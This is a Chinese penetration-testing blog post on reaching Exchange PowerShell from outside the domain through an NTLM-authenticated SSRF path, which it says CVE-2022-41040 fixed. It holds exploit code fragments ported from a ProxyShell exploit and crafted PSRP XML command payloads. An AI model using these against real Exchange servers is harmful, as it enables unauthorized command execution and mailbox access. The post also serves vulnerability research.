---
layout: post
title: 渗透技巧——远程访问Exchange Powershell
---


## 0x00 前言
---

Exchange Powershell基于PowerShell Remoting，通常需要在域内主机上访问Exchange Server的80端口，限制较多。本文介绍一种不依赖域内主机发起连接的实现方法，增加适用范围。

**注：**

该方法在CVE-2022–41040中被修复，修复位置：`C:\Program Files\Microsoft\Exchange Server\V15\Bin\Microsoft.Exchange.HttpProxy.Common.dll`中的`RemoveExplicitLogonFromUrlAbsoluteUri(string absoluteUri, string explicitLogonAddress)`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-10-7/2-2.png)

## 0x01 简介
---

本文将要介绍以下内容：

- 实现思路
- 实现细节

## 0x02 实现思路
---

常规用法下，使用Exchange Powershell需要注意以下问题：

- 所有域用户都可以连接Exchange PowerShell
- 需要在域内主机上发起连接
- 连接地址需要使用FQDN，不支持IP

常规用法无法在域外发起连接，而我们知道，通过ProxyShell可以从域外发起连接，利用SSRF执行Exchange Powershell

更进一步，在打了ProxyShell的补丁后，支持NTLM认证的SSRF没有取消，我们可以通过NTLM认证再次访问Exchange Powershell

## 0x03 实现细节
---

在代码实现上，我们可以加入NTLM认证传入凭据，示例代码：

```
from requests_ntlm import HttpNtlmAuth
res = requests.post(url, data=post_data, headers=headers, verify=False, auth=HttpNtlmAuth(username, password))   
```
                  
在执行Exchange Powershell命令时，我们可以选择[pypsrp](https://github.com/jborean93/pypsrp)或者Flask，具体细节可参考之前的文章[《ProxyShell利用分析2——CVE-2021-34523》](https://3gstudent.github.io/ProxyShell%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%902-CVE-2021-34523)和[《ProxyShell利用分析3——添加用户和文件写入》](https://3gstudent.github.io/ProxyShell%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%903-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%92%8C%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5)

[pypsrp](https://github.com/jborean93/pypsrp)或者Flask都是通过建立一个web代理，过滤修改通信数据实现命令执行

为了增加代码的适用范围，这里选择另外一种实现方法：模拟Exchange Powershell的正常通信数据，实现命令执行

可供参考的代码：https://gist.github.com/rskvp93/4e353e709c340cb18185f82dbec30e58

[代码](https://gist.github.com/rskvp93/4e353e709c340cb18185f82dbec30e58)使用了Python2，实现了ProxyShell的利用

基于这个代码，改写成支持Python3，功能为通过NTLM认证访问Exchange Powershell执行命令，具体需要注意的细节如下：

### 1.Python2和Python3在格式化字符存在差异

#### (1)

Python2下可用的代码：

```
class BasePacket:
    def serialize(self):
        Blob = ''.join([struct.pack('I', self.Destination),
                struct.pack('I', self.MessageType),
                self.RPID.bytes_le,
                self.PID.bytes_le,
                self.Data
            ])
        BlobLength = len(Blob)
        output = ''.join([struct.pack('>Q', self.ObjectId),
            struct.pack('>Q', self.FragmentId),
            self.Flags,
            struct.pack('>I', BlobLength),
            Blob ])
        return output 
```

以上代码在Python3下使用时，需要将`Str`转为`bytes`，并且为了避免不可见字符解析的问题，代码结构做了重新设计，Python3可用的代码：

```
def serialize(self):
    Blob = struct.pack('I', self.Destination) + struct.pack('I', self.MessageType) + self.RPID.bytes_le + self.PID.bytes_le + self.Data.encode('utf-8')
    BlobLength = len(Blob)
    output = struct.pack('>Q', self.ObjectId) + struct.pack('>Q', self.FragmentId) + self.Flags.encode('utf-8') + struct.pack('>I', BlobLength) + Blob       
    return output
```

#### (2)

Python2下可用的代码：

```
class CreationXML:
    def serialize(self):
        output = self.sessionCapability.serialize() + self.initRunspacPool.serialize()
        return base64.b64encode(output)
```

以上代码在Python3下使用时，需要将Str转为bytes，Python3可用的示例代码：

```
def serialize(self):
    output = self.sessionCapability.serialize() + self.initRunspacPool.serialize()
    return base64.b64encode(output).decode('utf-8')
```

#### (3)

Python2下可用的代码：

```
def receive_data(SessionId, commonAccessToken, ShellId):
    print "[+] Receive data util get RunspaceState packet"
    headers = {
        "Content-Type": "application/soap+xml;charset=UTF-8"
        }
    url = "/powershell?serializationLevel=Full;ExchClientVer=15.1.2044.4;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.14393.3053&X-Rps-CAT={commonAccessToken}".format(commonAccessToken=commonAccessToken)
    MessageID = uuid.uuid4()
    OperationID = uuid.uuid4()
    request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
    <s:Header>
        <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
        <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
        <a:ReplyTo>
            <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
        </a:ReplyTo>
        <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>
        <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
        <a:MessageID>uuid:{MessageID}</a:MessageID>
        <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
        <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
        <p:SessionId s:mustUnderstand="false">uuid:{SessionId}</p:SessionId>
        <p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
        <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
        <w:SelectorSet>
            <w:Selector Name="ShellId">{ShellId}</w:Selector>
        </w:SelectorSet>
        <w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <w:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">TRUE</w:Option>
        </w:OptionSet>
        <w:OperationTimeout>PT180.000S</w:OperationTimeout>
    </s:Header>
    <s:Body>
        <rsp:Receive xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"  SequenceId="0">
            <rsp:DesiredStream>stdout</rsp:DesiredStream>
        </rsp:Receive>
    </s:Body>
</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId)
    r = post_request(url, headers, request_data, {})
    if r.status_code == 200:
        doc = xml.dom.minidom.parseString(r.text);
        elements = doc.getElementsByTagName("rsp:Stream")
        if len(elements) == 0:
            print_error_and_exit("receive_data failed with no Stream return", r)
        for element in elements:
            stream = element.firstChild.nodeValue
            data = base64.b64decode(stream)
            if 'RunspaceState' in data:
                print "[+] Found RunspaceState packet"
                return True
```

以上代码在Python3下使用时，需要将`Str`转为`bytes`，为了避免不可见字符解析的问题，这里不能使用`.decode('utf-8')`，改为使用`.decode('ISO-8859-1')`

Python3可用的示例代码：

```
data = base64.b64decode(stream).decode('ISO-8859-1')
```


### 2.支持Exchange Powershell命令的XML文件格式

XML文件格式示例1：

```
<Obj RefId="0"><MS><B N="NoInput">true</B><Obj N="ApartmentState" RefId="1"><TN RefId="0"><T>System.Management.Automation.Runspaces.ApartmentState</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>UNKNOWN</ToString><I32>2</I32></Obj><Obj N="RemoteStreamOptions" RefId="2"><TN RefId="1"><T>System.Management.Automation.Runspaces.RemoteStreamOptions</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>AddInvocationInfo</ToString><I32>15</I32></Obj><B N="AddToHistory">false</B><Obj N="HostInfo" RefId="3"><MS><B N="_isHostNull">true</B><B N="_isHostUINull">true</B><B N="_isHostRawUINull">true</B><B N="_useRunspaceHost">true</B></MS></Obj><Obj N="PowerShell" RefId="4"><MS><B N="IsNested">false</B><Nil N="ExtraCmds" /><Obj N="Cmds" RefId="5"><TN RefId="2"><T>System.Collections.Generic.List`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]</T><T>System.Object</T></TN><LST><Obj RefId="6"><MS><S N="Cmd">Get-RoleGroupMember</S><B N="IsScript">false</B><Nil N="UseLocalScope" /><Obj N="MergeMyResult" RefId="7"><TN RefId="3"><T>System.Management.Automation.Runspaces.PipelineResultTypes</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeToResult" RefId="8"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergePreviousResults" RefId="9"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="Args" RefId="10"><TNRef RefId="2" /><LST><Obj RefId="11"><MS><Nil N="N" /><S N="V">Organization Management</S></MS></Obj></LST></Obj><Obj N="MergeError" RefId="12"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeWarning" RefId="13"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeVerbose" RefId="14"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeDebug" RefId="15"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj></MS></Obj></LST></Obj><Nil N="History" /><B N="RedirectShellErrorOutputPipe">false</B></MS></Obj><B N="IsNested">false</B></MS></Obj>
```

对应执行的命令为：`Get-RoleGroupMember "Organization Management"`

XML文件格式示例2：

```
<Obj RefId="0"><MS><B N="NoInput">true</B><Obj N="ApartmentState" RefId="1"><TN RefId="0"><T>System.Management.Automation.Runspaces.ApartmentState</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>UNKNOWN</ToString><I32>2</I32></Obj><Obj N="RemoteStreamOptions" RefId="2"><TN RefId="1"><T>System.Management.Automation.Runspaces.RemoteStreamOptions</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>AddInvocationInfo</ToString><I32>15</I32></Obj><B N="AddToHistory">false</B><Obj N="HostInfo" RefId="3"><MS><B N="_isHostNull">true</B><B N="_isHostUINull">true</B><B N="_isHostRawUINull">true</B><B N="_useRunspaceHost">true</B></MS></Obj><Obj N="PowerShell" RefId="4"><MS><B N="IsNested">false</B><Nil N="ExtraCmds" /><Obj N="Cmds" RefId="5"><TN RefId="2"><T>System.Collections.Generic.List`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]</T><T>System.Object</T></TN><LST><Obj RefId="6"><MS><S N="Cmd">Get-Mailbox</S><B N="IsScript">false</B><Nil N="UseLocalScope" /><Obj N="MergeMyResult" RefId="7"><TN RefId="3"><T>System.Management.Automation.Runspaces.PipelineResultTypes</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeToResult" RefId="8"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergePreviousResults" RefId="9"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="Args" RefId="10"><TNRef RefId="2" /><LST><Obj RefId="11"><MS><S N="N">-Identity</S><S N="V">administrator</S></MS></Obj></LST></Obj><Obj N="MergeError" RefId="12"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeWarning" RefId="13"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeVerbose" RefId="14"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj><Obj N="MergeDebug" RefId="15"><TNRef RefId="3" /><ToString>None</ToString><I32>0</I32></Obj></MS></Obj></LST></Obj><Nil N="History" /><B N="RedirectShellErrorOutputPipe">false</B></MS></Obj><B N="IsNested">false</B></MS></Obj>
```

对应执行的命令为：`Get-Mailbox -Identity administrator`

通过格式分析，可得出以下结论：

#### (1)属性`Cmd`对应命令名称

例如：

```
<S N="Cmd">Get-RoleGroupMember</S>

<S N="Cmd">Get-Mailbox</S>
```


#### (2)传入的命令参数需要注意格式

如果只传入1个参数，对应的格式为：

```
<Obj RefId="11"><MS><Nil N="N" /><S N="V">Organization Management</S></MS></Obj>
```

如果传入2个参数，对应的格式为：

```
<Obj RefId="11"><MS><S N="N">-Identity</S><S N="V">administrator</S></MS></Obj>
```

如果传入4个参数，对应的格式为：

```
<Obj RefId="11"><MS><S N="N">-Identity</S><S N="V">administrator</S></MS></Obj>
<Obj RefId="12"><MS><S N="N">-ResultSize</S><S N="V">1024</S></MS></Obj>
```

为此，我们可以使用以下代码实现参数填充：

```
def GenerateArgument(N_data, V_data):
    if len(N_data) == 0:
        Argument = """<Obj RefId="13"><MS><Nil N="N" /><S N="V">{V_data}</S></MS></Obj>""".format(V_data=V_data)
    else:
        Argument = """<Obj RefId="13"><MS><S N="N">{N_data}</S><S N="V">{V_data}</S></MS></Obj>""".format(N_data=N_data, V_data=V_data)
    return Argument
```

构造XML文件格式的实现代码：

```
    commandData = """<Obj RefId="0"><MS>
    <Obj N="PowerShell" RefId="1"><MS>
        <Obj N="Cmds" RefId="2">
            <TN RefId="0">
                <T>System.Collections.Generic.List`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]</T>
                <T>System.Object</T>
            </TN>
            <LST>
                <Obj RefId="3"><MS>
                    <S N="Cmd">{Cmdlet}</S>
                    <B N="IsScript">false</B>
                    <Nil N="UseLocalScope" />
                    <Obj N="MergeMyResult" RefId="4">
                        <TN RefId="1">
                            <T>System.Management.Automation.Runspaces.PipelineResultTypes</T>
                            <T>System.Enum</T>
                            <T>System.ValueType</T>
                            <T>System.Object</T>
                        </TN>
                        <ToString>None</ToString><I32>0</I32>
                    </Obj>
                    <Obj N="MergeToResult" RefId="5"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
                    <Obj N="MergePreviousResults" RefId="6"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
                    <Obj N="MergeError" RefId="7"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
                    <Obj N="MergeWarning" RefId="8"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
                    <Obj N="MergeVerbose" RefId="9"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
                    <Obj N="MergeDebug" RefId="10"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
                    <Obj N="MergeInformation" RefId="11"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
                    <Obj N="Args" RefId="12"><TNRef RefId="0" />
                        <LST>
                            {Argument}
                        </LST>
                    </Obj>
                </MS></Obj>
            </LST>
        </Obj>
        <B N="IsNested">false</B>
        <Nil N="History" />
        <B N="RedirectShellErrorOutputPipe">true</B>
    </MS></Obj>
    <B N="NoInput">true</B>
    <Obj N="ApartmentState" RefId="15">
        <TN RefId="2"><T>System.Threading.ApartmentState</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN>
        <ToString>Unknown</ToString><I32>2</I32>
    </Obj>
    <Obj N="RemoteStreamOptions" RefId="16">
        <TN RefId="3"><T>System.Management.Automation.RemoteStreamOptions</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN>
        <ToString>0</ToString><I32>0</I32>
    </Obj>
    <B N="AddToHistory">true</B>
    <Obj N="HostInfo" RefId="17"><MS>
        <B N="_isHostNull">true</B>
        <B N="_isHostUINull">true</B>
        <B N="_isHostRawUINull">true</B>
        <B N="_useRunspaceHost">true</B></MS>
    </Obj>
    <B N="IsNested">false</B>
</MS></Obj>""".format(Cmdlet=Cmdlet, Argument=Argument)
```

结合以上细节后，我们可以得出最终的实现代码，代码执行结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-10-7/2-1.png)

## 0x04 小结
---

本文介绍了远程访问Exchange Powershell的实现方法，优点是不依赖于域内主机上发起连接，该方法在CVE-2022–41040中被修复。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





